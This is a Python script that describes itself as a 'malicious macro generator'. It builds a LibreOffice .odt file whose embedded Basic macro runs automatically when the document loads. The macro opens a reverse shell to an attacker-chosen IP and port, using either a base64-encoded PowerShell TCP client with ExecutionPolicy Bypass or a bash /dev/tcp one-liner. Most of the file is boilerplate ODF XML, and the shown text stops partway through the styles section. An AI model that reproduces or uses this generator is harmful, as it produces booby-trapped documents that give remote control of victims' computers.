#!/usr/bin/python3

import time
import os
import sys
import base64

'''
├── Basic
│   ├── script-lc.xml
│   └── Standard
│       ├── Module1.xml
│       └── script-lb.xml
├── Configurations2
│   ├── accelerator
│   ├── floater
│   ├── images
│   │   └── Bitmaps
│   ├── menubar
│   ├── popupmenu
│   ├── progressbar
│   ├── statusbar
│   ├── toolbar
│   └── toolpanel
├── content.xml
├── manifest.rdf
├── META-INF
│   └── manifest.xml
├── meta.xml
├── mimetype
├── settings.xml
├── styles.xml
└── Thumbnails
    └── thumbnail.png

'''

def help():

	print ('LibreOffice .odt document malicious macro generator')
	print ('Usage python3 libreoffice-odt.py <linux/windows> <ip> <port>')
	sys.exit(1)

if len(sys.argv) < 4:

	help()

ip = sys.argv[2]
port = sys.argv[3]

if sys.argv[1] == 'windows':

	build_payload = ("$client = New-Object System.Net.Sockets.TCPClient('" + ip + "', " + port + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();")
	bytes_encoded = (base64.b64encode(bytes(build_payload, 'utf-16le')))
	base64payload = bytes_encoded.decode()
	payload = 'cmd.exe /C &apos;powershell.exe -ExecutionPolicy Bypass -e ' + base64payload + '&apos;'
	print ("[\033[32m+\033[0m] Payload: windows reverse shell")
	print ("[\033[32m+\033[0m] Creating malicious Libre Office .odt file\n")

if sys.argv[1] == 'linux':

	payload = '/bin/bash -c &apos;bash -i &gt;&amp; /dev/tcp/' + ip + '/' + port + ' 0&gt;&amp;1&apos;'
	print ("[\033[32m+\033[0m] Payload: linux reverse shell")
	print ("[\033[32m+\033[0m] Creating malicious Libre Office .odt file\n")

temporary_path='/tmp/libre_office/'
os.mkdir(temporary_path)

# Basic folder
os.mkdir(temporary_path + 'Basic')

basic_script_lc_xml='''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE library:libraries PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "libraries.dtd">
<library:libraries xmlns:library="http://openoffice.org/2000/library" xmlns:xlink="http://www.w3.org/1999/xlink">
 <library:library library:name="Standard" library:link="false"/>
</library:libraries>'''

file = open(temporary_path + 'Basic/' + 'script-lc.xml', 'w')
file.write(basic_script_lc_xml)
file.close()

os.mkdir(temporary_path + 'Basic/' + 'Standard')

basic_module_one_xml='''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE script:module PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "module.dtd">
<script:module xmlns:script="http://openoffice.org/2000/script" script:name="Module1" script:language="StarBasic" script:moduleType="normal">REM  *****  BASIC  *****

Sub Payday
Shell(&quot;''' + payload + '''&quot;)
End Sub
</script:module>'''

file = open(temporary_path + 'Basic/' + 'Standard/' + 'Module1.xml', 'w')
file.write(basic_module_one_xml)
file.close()

basic_script_lb_xml='''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE library:library PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "library.dtd">
<library:library xmlns:library="http://openoffice.org/2000/library" library:name="Standard" library:readonly="false" library:passwordprotected="false">
 <library:element library:name="Module1"/>
</library:library>'''

file = open(temporary_path + 'Basic/' + 'Standard/' + 'script-lb.xml', 'w')
file.write(basic_script_lb_xml)
file.close()

## END of basic

# Configurations2
os.mkdir(temporary_path + 'Configurations2')
list = ['accelerator', 'floater', 'images', 'menubar', 'popupmenu', 'progressbar', 'statusbar', 'toolbar', 'toolpanel']
for i in list:
        os.mkdir(temporary_path + 'Configurations2/' + i)
os.mkdir(temporary_path + 'Configurations2/images/Bitmaps')
# END configurtions2

# Content.xml

content_xml='''<?xml version="1.0" encoding="UTF-8"?>
<office:document-content xmlns:meta="urn:oasis:names:tc:opendocument:xmlns:meta:1.0" xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:fo="urn:oasis:names:tc:opendocument:xmlns:xsl-fo-compatible:1.0" xmlns:ooo="http://openoffice.org/2004/office" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:style="urn:oasis:names:tc:opendocument:xmlns:style:1.0" xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" xmlns:draw="urn:oasis:names:tc:opendocument:xmlns:drawing:1.0" xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" xmlns:svg="urn:oasis:names:tc:opendocument:xmlns:svg-compatible:1.0" xmlns:chart="urn:oasis:names:tc:opendocument:xmlns:chart:1.0" xmlns:rpt="http://openoffice.org/2005/report" xmlns:table="urn:oasis:names:tc:opendocument:xmlns:table:1.0" xmlns:number="urn:oasis:names:tc:opendocument:xmlns:datastyle:1.0" xmlns:ooow="http://openoffice.org/2004/writer" xmlns:oooc="http://openoffice.org/2004/calc" xmlns:of="urn:oasis:names:tc:opendocument:xmlns:of:1.2" xmlns:tableooo="http://openoffice.org/2009/table" xmlns:calcext="urn:org:documentfoundation:names:experimental:calc:xmlns:calcext:1.0" xmlns:drawooo="http://openoffice.org/2010/draw" xmlns:loext="urn:org:documentfoundation:names:experimental:office:xmlns:loext:1.0" xmlns:field="urn:openoffice:names:experimental:ooo-ms-interop:xmlns:field:1.0" xmlns:math="http://www.w3.org/1998/Math/MathML" xmlns:form="urn:oasis:names:tc:opendocument:xmlns:form:1.0" xmlns:script="urn:oasis:names:tc:opendocument:xmlns:script:1.0" xmlns:dom="http://www.w3.org/2001/xml-events" xmlns:xforms="http://www.w3.org/2002/xforms" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:formx="urn:openoffice:names:experimental:ooxml-odf-interop:xmlns:form:1.0" xmlns:xhtml="http://www.w3.org/1999/xhtml" xmlns:grddl="http://www.w3.org/2003/g/data-view#" xmlns:css3t="http://www.w3.org/TR/css3-text/" xmlns:officeooo="http://openoffice.org/2009/office" office:version="1.3"><office:scripts><office:event-listeners><script:event-listener script:language="ooo:script" script:event-name="dom:load" xlink:href="vnd.sun.star.script:Standard.Module1.Payday?language=Basic&amp;location=document" xlink:type="simple"/></office:event-listeners></office:scripts><office:font-face-decls><style:font-face style:name="Arial" svg:font-family="Arial" style:font-family-generic="swiss"/><style:font-face style:name="Arial1" svg:font-family="Arial" style:font-family-generic="system" style:font-pitch="variable"/><style:font-face style:name="Liberation Sans" svg:font-family="&apos;Liberation Sans&apos;" style:font-family-generic="swiss" style:font-pitch="variable"/><style:font-face style:name="Liberation Serif" svg:font-family="&apos;Liberation Serif&apos;" style:font-family-generic="roman" style:font-pitch="variable"/><style:font-face style:name="Microsoft YaHei" svg:font-family="&apos;Microsoft YaHei&apos;" style:font-family-generic="system" style:font-pitch="variable"/><style:font-face style:name="NSimSun" svg:font-family="NSimSun" style:font-family-generic="system" style:font-pitch="variable"/></office:font-face-decls><office:automatic-styles/><office:body><office:text><text:sequence-decls><text:sequence-decl text:display-outline-level="0" text:name="Illustration"/><text:sequence-decl text:display-outline-level="0" text:name="Table"/><text:sequence-decl text:display-outline-level="0" text:name="Text"/><text:sequence-decl text:display-outline-level="0" text:name="Drawing"/><text:sequence-decl text:display-outline-level="0" text:name="Figure"/></text:sequence-decls><text:p text:style-name="Standard"/></office:text></office:body></office:document-content>'''

file = open(temporary_path + 'content.xml', 'w')
file.write(content_xml)
file.close()

# END content.xml

# Manifest.rdf

manifest_rdf='''<?xml version="1.0" encoding="utf-8"?>
<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
  <rdf:Description rdf:about="styles.xml">
    <rdf:type rdf:resource="http://docs.oasis-open.org/ns/office/1.2/meta/odf#StylesFile"/>
  </rdf:Description>
  <rdf:Description rdf:about="">
    <ns0:hasPart xmlns:ns0="http://docs.oasis-open.org/ns/office/1.2/meta/pkg#" rdf:resource="styles.xml"/>
  </rdf:Description>
  <rdf:Description rdf:about="content.xml">
    <rdf:type rdf:resource="http://docs.oasis-open.org/ns/office/1.2/meta/odf#ContentFile"/>
  </rdf:Description>
  <rdf:Description rdf:about="">
    <ns0:hasPart xmlns:ns0="http://docs.oasis-open.org/ns/office/1.2/meta/pkg#" rdf:resource="content.xml"/>
  </rdf:Description>
  <rdf:Description rdf:about="">
    <rdf:type rdf:resource="http://docs.oasis-open.org/ns/office/1.2/meta/pkg#Document"/>
  </rdf:Description>
</rdf:RDF>'''

file = open(temporary_path + 'manifest.rdf', 'w')
file.write(manifest_rdf)
file.close()

# END manifest.rdf

# META-INF

os.mkdir(temporary_path + 'META-INF')

manifest_xml='''<?xml version="1.0" encoding="UTF-8"?>
<manifest:manifest xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0" manifest:version="1.3" xmlns:loext="urn:org:documentfoundation:names:experimental:office:xmlns:loext:1.0">
 <manifest:file-entry manifest:full-path="/" manifest:version="1.3" manifest:media-type="application/vnd.oasis.opendocument.text"/>
 <manifest:file-entry manifest:full-path="Basic/Standard/Module1.xml" manifest:media-type="text/xml"/>
 <manifest:file-entry manifest:full-path="Basic/Standard/script-lb.xml" manifest:media-type="text/xml"/>
 <manifest:file-entry manifest:full-path="Basic/script-lc.xml" manifest:media-type="text/xml"/>
 <manifest:file-entry manifest:full-path="Configurations2/" manifest:media-type="application/vnd.sun.xml.ui.configuration"/>
 <manifest:file-entry manifest:full-path="manifest.rdf" manifest:media-type="application/rdf+xml"/>
 <manifest:file-entry manifest:full-path="styles.xml" manifest:media-type="text/xml"/>
 <manifest:file-entry manifest:full-path="meta.xml" manifest:media-type="text/xml"/>
 <manifest:file-entry manifest:full-path="settings.xml" manifest:media-type="text/xml"/>
 <manifest:file-entry manifest:full-path="content.xml" manifest:media-type="text/xml"/>
 <manifest:file-entry manifest:full-path="Thumbnails/thumbnail.png" manifest:media-type="image/png"/>
</manifest:manifest>'''

file = open(temporary_path + 'META-INF/' + 'manifest.xml', 'w')
file.write(manifest_xml)
file.close()

# END meta-inf

# Meta.xml

meta_xml='''<?xml version="1.0" encoding="UTF-8"?>
<office:document-meta xmlns:grddl="http://www.w3.org/2003/g/data-view#" xmlns:meta="urn:oasis:names:tc:opendocument:xmlns:meta:1.0" xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:ooo="http://openoffice.org/2004/office" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:dc="http://purl.org/dc/elements/1.1/" office:version="1.3"><office:meta><meta:creation-date>2022-06-04T23:27:38.217000000</meta:creation-date><meta:generator>LibreOffice/7.3.3.2$Windows_X86_64 LibreOffice_project/d1d0ea68f081ee2800a922cac8f79445e4603348</meta:generator><dc:date>2022-06-04T23:34:46.034000000</dc:date><meta:editing-duration>PT5M35S</meta:editing-duration><meta:editing-cycles>3</meta:editing-cycles><meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="1" meta:paragraph-count="0" meta:word-count="0" meta:character-count="0" meta:non-whitespace-character-count="0"/></office:meta></office:document-meta>'''

file = open(temporary_path + 'meta.xml', 'w')
file.write(meta_xml)
file.close()

# END meta.xml

# Mimetype

mimetype='''application/vnd.oasis.opendocument.text'''

file = open(temporary_path + 'mimetype', 'w')
file.write(mimetype)
file.close()

# END mimetype

# Settings.xml

settings_xml='''<?xml version="1.0" encoding="UTF-8"?>
<office:document-settings xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:ooo="http://openoffice.org/2004/office" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:config="urn:oasis:names:tc:opendocument:xmlns:config:1.0" office:version="1.3"><office:settings><config:config-item-set config:name="ooo:view-settings"><config:config-item config:name="ViewAreaTop" config:type="long">0</config:config-item><config:config-item config:name="ViewAreaLeft" config:type="long">0</config:config-item><config:config-item config:name="ViewAreaWidth" config:type="long">24952</config:config-item><config:config-item config:name="ViewAreaHeight" config:type="long">13072</config:config-item><config:config-item config:name="ShowRedlineChanges" config:type="boolean">true</config:config-item><config:config-item config:name="InBrowseMode" config:type="boolean">false</config:config-item><config:config-item-map-indexed config:name="Views"><config:config-item-map-entry><config:config-item config:name="ViewId" config:type="string">view2</config:config-item><config:config-item config:name="ViewLeft" config:type="long">3976</config:config-item><config:config-item config:name="ViewTop" config:type="long">2501</config:config-item><config:config-item config:name="VisibleLeft" config:type="long">0</config:config-item><config:config-item config:name="VisibleTop" config:type="long">0</config:config-item><config:config-item config:name="VisibleRight" config:type="long">24950</config:config-item><config:config-item config:name="VisibleBottom" config:type="long">13070</config:config-item><config:config-item config:name="ZoomType" config:type="short">0</config:config-item><config:config-item config:name="ViewLayoutColumns" config:type="short">1</config:config-item><config:config-item config:name="ViewLayoutBookMode" config:type="boolean">false</config:config-item><config:config-item config:name="ZoomFactor" config:type="short">100</config:config-item><config:config-item config:name="IsSelectedFrame" config:type="boolean">false</config:config-item><config:config-item config:name="KeepRatio" config:type="boolean">false</config:config-item><config:config-item config:name="AnchoredTextOverflowLegacy" config:type="boolean">false</config:config-item></config:config-item-map-entry></config:config-item-map-indexed></config:config-item-set><config:config-item-set config:name="ooo:configuration-settings"><config:config-item config:name="ProtectForm" config:type="boolean">false</config:config-item><config:config-item config:name="PrinterName" config:type="string"/><config:config-item config:name="EmbeddedDatabaseName" config:type="string"/><config:config-item config:name="CurrentDatabaseDataSource" config:type="string"/><config:config-item config:name="LinkUpdateMode" config:type="short">1</config:config-item><config:config-item config:name="AddParaTableSpacingAtStart" config:type="boolean">true</config:config-item><config:config-item config:name="FloattableNomargins" config:type="boolean">false</config:config-item><config:config-item config:name="UnbreakableNumberings" config:type="boolean">false</config:config-item><config:config-item config:name="FieldAutoUpdate" config:type="boolean">true</config:config-item><config:config-item config:name="AddVerticalFrameOffsets" config:type="boolean">false</config:config-item><config:config-item config:name="BackgroundParaOverDrawings" config:type="boolean">false</config:config-item><config:config-item config:name="AddParaTableSpacing" config:type="boolean">true</config:config-item><config:config-item config:name="ChartAutoUpdate" config:type="boolean">true</config:config-item><config:config-item config:name="CurrentDatabaseCommand" config:type="string"/><config:config-item config:name="PrinterSetup" config:type="base64Binary"/><config:config-item config:name="AlignTabStopPosition" config:type="boolean">true</config:config-item><config:config-item config:name="PrinterPaperFromSetup" config:type="boolean">false</config:config-item><config:config-item config:name="IsKernAsianPunctuation" config:type="boolean">false</config:config-item><config:config-item config:name="CharacterCompressionType" config:type="short">0</config:config-item><config:config-item config:name="ApplyUserData" config:type="boolean">true</config:config-item><config:config-item config:name="DoNotJustifyLinesWithManualBreak" config:type="boolean">false</config:config-item><config:config-item config:name="SaveThumbnail" config:type="boolean">true</config:config-item><config:config-item config:name="SaveGlobalDocumentLinks" config:type="boolean">false</config:config-item><config:config-item config:name="SmallCapsPercentage66" config:type="boolean">false</config:config-item><config:config-item config:name="CurrentDatabaseCommandType" config:type="int">0</config:config-item><config:config-item config:name="SaveVersionOnClose" config:type="boolean">false</config:config-item><config:config-item config:name="UpdateFromTemplate" config:type="boolean">true</config:config-item><config:config-item config:name="DoNotCaptureDrawObjsOnPage" config:type="boolean">false</config:config-item><config:config-item config:name="UseFormerObjectPositioning" config:type="boolean">false</config:config-item><config:config-item config:name="PrintSingleJobs" config:type="boolean">false</config:config-item><config:config-item config:name="EmbedSystemFonts" config:type="boolean">false</config:config-item><config:config-item config:name="PrinterIndependentLayout" config:type="string">high-resolution</config:config-item><config:config-item config:name="IsLabelDocument" config:type="boolean">false</config:config-item><config:config-item config:name="AddFrameOffsets" config:type="boolean">false</config:config-item><config:config-item config:name="AddExternalLeading" config:type="boolean">true</config:config-item><config:config-item config:name="MsWordCompMinLineHeightByFly" config:type="boolean">false</config:config-item><config:config-item config:name="UseOldNumbering" config:type="boolean">false</config:config-item><config:config-item config:name="OutlineLevelYieldsNumbering" config:type="boolean">false</config:config-item><config:config-item config:name="DoNotResetParaAttrsForNumFont" config:type="boolean">false</config:config-item><config:config-item config:name="IgnoreFirstLineIndentInNumbering" config:type="boolean">false</config:config-item><config:config-item config:name="AllowPrintJobCancel" config:type="boolean">true</config:config-item><config:config-item config:name="UseFormerLineSpacing" config:type="boolean">false</config:config-item><config:config-item config:name="AddParaSpacingToTableCells" config:type="boolean">true</config:config-item><config:config-item config:name="AddParaLineSpacingToTableCells" config:type="boolean">true</config:config-item><config:config-item config:name="UseFormerTextWrapping" config:type="boolean">false</config:config-item><config:config-item config:name="RedlineProtectionKey" config:type="base64Binary"/><config:config-item config:name="ConsiderTextWrapOnObjPos" config:type="boolean">false</config:config-item><config:config-item config:name="TableRowKeep" config:type="boolean">false</config:config-item><config:config-item config:name="TabsRelativeToIndent" config:type="boolean">true</config:config-item><config:config-item config:name="IgnoreTabsAndBlanksForLineCalculation" config:type="boolean">false</config:config-item><config:config-item config:name="RsidRoot" config:type="int">1309806</config:config-item><config:config-item config:name="LoadReadonly" config:type="boolean">false</config:config-item><config:config-item config:name="ClipAsCharacterAnchoredWriterFlyFrames" config:type="boolean">false</config:config-item><config:config-item config:name="UnxForceZeroExtLeading" config:type="boolean">false</config:config-item><config:config-item config:name="UseOldPrinterMetrics" config:type="boolean">false</config:config-item><config:config-item config:name="TabAtLeftIndentForParagraphsInList" config:type="boolean">false</config:config-item><config:config-item config:name="Rsid" config:type="int">1564438</config:config-item><config:config-item config:name="MsWordCompTrailingBlanks" config:type="boolean">false</config:config-item><config:config-item config:name="MathBaselineAlignment" config:type="boolean">true</config:config-item><config:config-item config:name="InvertBorderSpacing" config:type="boolean">false</config:config-item><config:config-item config:name="CollapseEmptyCellPara" config:type="boolean">true</config:config-item><config:config-item config:name="TabOverflow" config:type="boolean">true</config:config-item><config:config-item config:name="StylesNoDefault" config:type="boolean">false</config:config-item><config:config-item config:name="ClippedPictures" config:type="boolean">false</config:config-item><config:config-item config:name="EmbedFonts" config:type="boolean">false</config:config-item><config:config-item config:name="EmbedOnlyUsedFonts" config:type="boolean">false</config:config-item><config:config-item config:name="EmbedLatinScriptFonts" config:type="boolean">true</config:config-item><config:config-item config:name="EmbedAsianScriptFonts" config:type="boolean">true</config:config-item><config:config-item config:name="EmptyDbFieldHidesPara" config:type="boolean">true</config:config-item><config:config-item config:name="EmbedComplexScriptFonts" config:type="boolean">true</config:config-item><config:config-item config:name="TabOverMargin" config:type="boolean">false</config:config-item><config:config-item config:name="TabOverSpacing" config:type="boolean">false</config:config-item><config:config-item config:name="TreatSingleColumnBreakAsPageBreak" config:type="boolean">false</config:config-item><config:config-item config:name="SurroundTextWrapSmall" config:type="boolean">false</config:config-item><config:config-item config:name="ApplyParagraphMarkFormatToNumbering" config:type="boolean">false</config:config-item><config:config-item config:name="PropLineSpacingShrinksFirstLine" config:type="boolean">true</config:config-item><config:config-item config:name="SubtractFlysAnchoredAtFlys" config:type="boolean">false</config:config-item><config:config-item config:name="DisableOffPagePositioning" config:type="boolean">false</config:config-item><config:config-item config:name="ContinuousEndnotes" config:type="boolean">false</config:config-item><config:config-item config:name="ProtectBookmarks" config:type="boolean">false</config:config-item><config:config-item config:name="ProtectFields" config:type="boolean">false</config:config-item><config:config-item config:name="HeaderSpacingBelowLastPara" config:type="boolean">false</config:config-item><config:config-item config:name="FrameAutowidthWithMorePara" config:type="boolean">false</config:config-item><config:config-item config:name="GutterAtTop" config:type="boolean">false</config:config-item><config:config-item config:name="FootnoteInColumnToPageEnd" config:type="boolean">true</config:config-item><config:config-item config:name="PrintAnnotationMode" config:type="short">0</config:config-item><config:config-item config:name="PrintGraphics" config:type="boolean">true</config:config-item><config:config-item config:name="PrintBlackFonts" config:type="boolean">false</config:config-item><config:config-item config:name="PrintLeftPages" config:type="boolean">true</config:config-item><config:config-item config:name="PrintControls" config:type="boolean">true</config:config-item><config:config-item config:name="PrintPageBackground" config:type="boolean">true</config:config-item><config:config-item config:name="PrintTextPlaceholder" config:type="boolean">false</config:config-item><config:config-item config:name="PrintDrawings" config:type="boolean">true</config:config-item><config:config-item config:name="PrintHiddenText" config:type="boolean">false</config:config-item><config:config-item config:name="PrintProspect" config:type="boolean">false</config:config-item><config:config-item config:name="PrintTables" config:type="boolean">true</config:config-item><config:config-item config:name="PrintProspectRTL" config:type="boolean">false</config:config-item><config:config-item config:name="PrintReversed" config:type="boolean">false</config:config-item><config:config-item config:name="PrintRightPages" config:type="boolean">true</config:config-item><config:config-item config:name="PrintFaxName" config:type="string"/><config:config-item config:name="PrintPaperFromSetup" config:type="boolean">false</config:config-item><config:config-item config:name="PrintEmptyPages" config:type="boolean">true</config:config-item></config:config-item-set></office:settings></office:document-settings>'''

file = open(temporary_path + 'settings.xml', 'w')
file.write(settings_xml)
file.close()

# END settings.xml

# Styles.xml

styles_xml='''<?xml version="1.0" encoding="UTF-8"?>
<office:document-styles xmlns:meta="urn:oasis:names:tc:opendocument:xmlns:meta:1.0" xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:fo="urn:oasis:names:tc:opendocument:xmlns:xsl-fo-compatible:1.0" xmlns:ooo="http://openoffice.org/2004/office" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:style="urn:oasis:names:tc:opendocument:xmlns:style:1.0" xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" xmlns:draw="urn:oasis:names:tc:opendocument:xmlns:drawing:1.0" xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" xmlns:svg="urn:oasis:names:tc:opendocument:xmlns:svg-compatible:1.0" xmlns:chart="urn:oasis:names:tc:opendocument:xmlns:chart:1.0" xmlns:rpt="http://openoffice.org/2005/report" xmlns:table="urn:oasis:names:tc:opendocument:xmlns:table:1.0" xmlns:number="urn:oasis:names:tc:opendocument:xmlns:datastyle:1.0" xmlns:ooow="http://openoffice.org/2004/writer" xmlns:oooc="http://openoffice.org/2004/calc" xmlns:of="urn:oasis:names:tc:opendocument:xmlns:of:1.2" xmlns:tableooo="http://openoffice.org/2009/table" xmlns:calcext="urn:org:documentfoundation:names:experimental:calc:xmlns:calcext:1.0" xmlns:drawooo="http://openoffice.org/2010/draw" xmlns:loext="urn:org:documentfoundation:names:experimental:office:xmlns:loext:1.0" xmlns:field="urn:openoffice:names:experimental:ooo-ms-interop:xmlns:field:1.0" xmlns:math="http://www.w3.org/1998/Math/MathML" xmlns:form="urn:oasis:names:tc:opendocument:xmlns:form:1.0" xmlns:script="urn:oasis:names:tc:opendocument:xmlns:script:1.0" xmlns:dom="http://www.w3.org/2001/xml-events" xmlns:xhtml="http://www.w3.org/1999/xhtml" xmlns:grddl="http://www.w3.org/2003/g/data-view#" xmlns:css3t="http://www.w3.org/TR/css3-text/" xmlns:officeooo="http://openoffice.org/2009/office" office:version="1.3"><office:font-face-decls><style:font-face style:name="Arial" svg:font-family="Arial" style:font-family-generic="swiss"/><style:font-face style:name="Arial1" svg:font-family="Arial" style:font-family-generic="system" style:font-pitch="variable"/><style:font-face style:name="Liberation Sans" svg:font-family="&apos;Liberation Sans&apos;" style:font-family-generic="swiss" style:font-pitch="variable"/><style:font-face style:name="Liberation Serif" svg:font-family="&apos;Liberation Serif&apos;" style:font-family-generic="roman" style:font-pitch="variable"/><style:font-face style:name="Microsoft YaHei" svg:font-family="&apos;Microsoft YaHei&apos;" style:font-family-generic="system" style:font-pitch="variable"/><style:font-face style:name="NSimSun" svg:font-family="NSimSun" style:font-family-generic="system" style:font-pitch="variable"/></office:font-face-decls><office:styles><style:default-style style:family="graphic"><style:graphic-properties svg:stroke-color="#3465a4" draw:fill-color="#729fcf" fo:wrap-option="no-wrap" draw:shadow-offset-x="0.3cm" draw:shadow-offset-y="0.3cm" draw:start-line-spacing-horizontal="0.283cm" draw:start-line-spacing-vertical="0.283cm" draw:end-line-spacing-horizontal="0.283cm" draw:end-line-spacing-vertical="0.283cm" style:flow-with-text="false"/><style:paragraph-properties style:text-autospace="ideograph-alpha" style:line-break="strict" style:font-independent-line-spacing="false"><style:tab-stops/></style:paragraph-properties><style:text-properties style:use-window-font-color="true" loext:opacity="0%" style:font-name="Liberation Serif" fo:font-size="12pt" fo:language="es" fo:country="ES" style:letter-kerning="true" style:font-name-asian="NSimSun" style:font-size-asian="10.5pt" style:language-asian="zh" style:country-asian="CN" style:font-name-complex="Arial1" style:font-size-complex="12pt" style:language-complex="hi" style:country-complex="IN"/></style:default-style><style:default-style style:family="paragraph"><style:paragraph-properties fo:orphans="2" fo:widows="2" fo:hyphenation-ladder-count="no-limit" style:text-autospace="ideograph-alpha" style:punctuation-wrap="hanging" style:line-break="strict" style:tab-stop-distance="1.251cm" style:writing-mode="page"/><style:text-properties style:use-window-font-color="true" loext:opacity="0%" style:font-name="Liberation Serif" fo:font-size="12pt" fo:language="es" fo:country="ES" style:letter-kerning="true" style:font-name-asian="NSimSun" style:font-size-asian="10.5pt" style:language-asian="zh" style:country-asian="CN" style:font-name-complex="Arial1" style:font-size-complex="12pt" style:language-complex="hi" style:country-complex="IN" fo:hyphenate="false" fo:hyphenation-remain-char-count="2" fo:hyphenation-push-char-count="2" loext:hyphenation-no-caps="false"/></style:default-style><style:default-style style:family="table"><style:table-properties table:border-model="collapsing"/></style:default-style><style:default-style style:family="table-row"><style:table-row-properties fo:keep-together="auto"/></style:default-style><style:style style:name="Standard" style:family="paragraph" style:class="text"/><style:style style:name="Heading" style:family="paragraph" style:parent-style-name="Standard" style:next-style-name="Text_20_body" style:class="text"><style:paragraph-properties fo:margin-top="0.423cm" fo:margin-bottom="0.212cm" style:contextual-spacing="false" fo:keep-with-next="always"/><style:text-properties style:font-name="Liberation Sans" fo:font-family="&apos;Liberation Sans&apos;" style:font-family-generic="swiss" style:font-pitch="variable" fo:font-size="14pt" style:font-name-asian="Microsoft YaHei" style:font-family-asian="&apos;Microsoft YaHei&apos;" style:font-family-generic-asian="system" style:font-pitch-asian="variable" style:font-size-asian="14pt" style:font-name-complex="Arial1" style:font-family-complex="Arial" style:font-family-generic-complex="system" style:font-pitch-complex="variable" style:font-size-complex="14pt"/></style:style><style:style style:name="Text_20_body" style:display-name="Text body" style:family="paragraph" style:parent-style-name="Standard" style:class="text"><style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.247cm" style:contextual-spacing="false" fo:line-height="115%"/></style:style><style:style style:name="List" style:family="paragraph" style:parent-style-name="Text_20_body" style:class="list"><style:text-properties style:font-size-asian="12pt" style:font-name-complex="Arial" style:font-family-complex="Arial" style:font-family-generic-complex="swiss"/></style:style><style:style style:name="Caption" style:family="paragraph" style:parent-style-name="Standard" style:class="extra"><style:paragraph-properties fo:margin-top="0.212cm" fo:margin-bottom="0.212cm" style:contextual-spacing="false" text:number-lines="false" text:line-number="0"/><style:text-properties fo:font-size="12pt" fo:font-style="italic" style:font-size-asian="12pt" style:font-style-asian="italic" style:font-name-complex="Arial" style:font-family-complex="Arial" style:font-family-generic-complex="swiss" style:font-size-complex="12pt" style:font-style-complex="italic"/></style:style><style:style style:name="Index" style:family="paragraph" style:parent-style-name="Standard" style:class="index"><style:paragraph-properties text:number-lines="false" text:line-number="0"/><style:text-properties fo:language="zxx" fo:country="none" style:font-size-asian="12pt" style:language-asian="zxx" style:country-asian="none" style:font-name-complex="Arial" style:font-family-complex="Arial" style:font-family-generic-complex="swiss" style:language-complex="zxx" style:country-complex="none"/></style:style><text:outline-style style:name="Outline"><text:outline-level-style text:level="1" loext:num-list-format="%1%" style:num-format=""><style:list-level-properties text:list-level-position-and-space-mode="label-alignment"><style:list-level-label-alignment text:label-followed-by="listtab"/></style:list-level-properties></text:outline-level-style><text:outline-level-style text:level="2" loext:num-list-format="%2%" style:num-format=""><style:list-level-properties text:list-level-position-and-space-mode="label-alignment"><style:list-level-label-alignment text:label-followed-by="listtab"/></style:list-level-properties></text:outline-level-style><text:outline-level-style text:level="3" loext:num-list-format="%3%" style:num-format=""><style:list-level-properties text:list-level-position-and-space-mode="label-alignment"><style:list-level-label-alignment text:label-followed-by="listtab"/></style:list-level-properties></text:outline-level-style><text:outline-level-style text:level="4" loext:num-list-format="%4%" style:num-format=""><style:list-level-properties text:list-level-position-and-space-mode="label-alignment"><style:list-level-label-alignment text:label-followed-by="listtab"/></style:list-level-properties></text:outline-level-style><text:outline-level-style text:level="5" loext:num-list-format="%5%" style:num-format=""><style:list-level-properties text:list-level-position-and-space-mode="label-alignment"><style:list-level-label-alignment text:label-followed-by="listtab"/></style:list-level-properties></text:outline-level-style><text:outline-level-style text:level="6" loext:num-list-format="%6%" style:num-format=""><style:list-level-properties text:list-level-position-and-space-mode="label-alignment"><style:list-level-label-alignment text:label-followed-by="listtab"/></style:list-level-properties></text:outline-level-style><text:outline-level-style text:level="7" loext:num-list-format="%7%" style:num-format=""><style:list-level-properties text:list-level-position-and-space-mode="label-alignment"><style:list-level-label-alignment text:label-followed-by="listtab"/></style:list-level-properties></text:outline-level-style><text:outline-level-style text:level="8" loext:num-list-format="%8%" style:num-format=""><style:list-level-properties text:list-level-position-and-space-mode="label-alignment"><style:list-level-label-alignment text:label-followed-by="listtab"/></style:list-level-properties></text:outline-level-style><text:outline-level-style text:level="9" loext:num-list-format="%9%" style:num-format=""><style:list-level-properties text:list-level-position-and-space-mode="label-alignment"><style:list-level-label-alignment text:label-followed-by="listtab"/></style:list-level-properties></text:outline-level-style><text:outline-level-style text:level="10" loext:num-list-format="%10%" style:num-format=""><style:list-level-properties text:list-level-position-and-space-mode="label-alignment"><style:list-level-label-alignment 